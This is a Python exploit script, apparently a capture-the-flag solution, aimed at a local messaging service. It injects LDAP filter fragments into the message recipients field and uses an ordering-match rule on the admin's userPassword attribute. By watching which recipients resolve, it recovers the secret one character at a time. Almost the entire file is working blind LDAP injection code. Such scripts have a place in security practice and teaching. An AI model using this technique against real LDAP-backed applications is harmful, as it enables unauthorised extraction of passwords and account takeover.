import time
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
import string
import requests

BASE_URL = 'http://localhost:8000'
MAX_TRIES = 10
TARGET_USER = 'admin'
CHARSET = list(sorted(ord(c) for c in string.ascii_lowercase + string.digits + '_'))


adapter = HTTPAdapter(max_retries=Retry(
    total=3,
    backoff_factor=1,
    status_forcelist=[429],
    method_whitelist=["GET", "POST"]
))
sess = requests.Session()
sess.mount("https://", adapter)
sess.mount("http://", adapter)

n_requests = 0
start = time.time()

# 0. Get a token
token = sess.post(f"{BASE_URL}/token").json()["access_token"]

def send_message(targets):
    global n_requests
    n_requests += 1
    return sess.post(f"{BASE_URL}/message", json={
        "recipients": targets,
        "content": "solving",
        "identity_provider": "ldap"
    }, headers={'Authorization': f'Bearer {token}'}).json()

def message_status(msg_id):
    global n_requests
    n_requests += 1
    return sess.get(f"{BASE_URL}/message/{msg_id}/status", headers={
        'Authorization': f'Bearer {token}'
    }).json()

def message_info(msg_id):
    global n_requests
    n_requests += 1
    return sess.get(f"{BASE_URL}/message/{msg_id}", headers={
        'Authorization': f'Bearer {token}'
    }).json()

def send_and_process_msg(targets):
    msg_id = send_message(targets)
    n_tries = 0
    while (status := message_status(msg_id)) not in ['failed', 'sent'] and n_tries < MAX_TRIES:
        n_tries += 1
        time.sleep(0.1)
    assert n_tries < MAX_TRIES
    return message_info(msg_id)

def encode(c):
    return f'\\{c:02x}'
def guess_character(known):
    prefix = f"{TARGET_USER})(userPassword:2.5.13.18:=" + "".join(encode(ord(c)) for c in list(known))

    # Naively just search everything
    for i in range(0, len(CHARSET), 8):
        guesses = [prefix+encode(c) for c in CHARSET[i:i+8]]
        msg = send_and_process_msg(guesses)
        if len(msg['recipients']) > 0:
            recipient = min(int(r.split('\\')[-1], 16) for r in msg['recipients'])
            return CHARSET[CHARSET.index(recipient) - 1]
    return None

known = 'DUCTF{'
while (c := guess_character(known)) is not None:
    known += chr(c)
    print(known, end="\r")

print("FLAG:", known + '}')
print("REQS:", n_requests)
print("TIME:", time.time() - start)
